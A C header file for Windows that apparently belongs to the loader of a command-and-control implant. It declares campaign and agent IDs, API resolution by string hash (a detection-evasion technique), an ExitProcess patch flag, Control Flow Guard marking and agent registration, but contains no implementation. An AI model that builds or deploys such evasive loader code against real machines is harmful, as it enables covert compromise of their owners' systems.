#pragma once
#include <windows.h>
#include "../api/apis.h"
#include "nt.h"
#include "utils.h"


#ifdef DEBUG
#define DBGA(msg) do { \
    DWORD _w; \
    WriteFile( \
    GetStdHandle(STD_OUTPUT_HANDLE), \
    msg, LdrStrlen(msg), &_w, NULL); \
} while(0)
#else
#define DBGA(msg)
#endif

typedef struct _Config {
	CHAR CampaignID[37];
	CHAR AgentId[37];
} Config;

typedef struct _LdrInstance {
	Win32 *win32;
	Modules *modules;
	Config *config;
	BOOL ExitProcessPatched;
	

} LdrInstance;

extern LdrInstance *ldr;
extern PVOID g_ImageBase;


HMODULE GetModule(DWORD Hash);
FARPROC GetProc(HANDLE dll, DWORD Hash);
DWORD HashStringA(const char *str);
DWORD HashStringW(const wchar_t *str);

void LdrMain();
void LdrMarkCfgValidImage(PVOID Base);
BOOL LdrAllocateCoreStructsAndLoadApis();
BOOL ParseConfig();
BOOL LdrRegisterAgent();

void LdrExitThread(NTSTATUS code);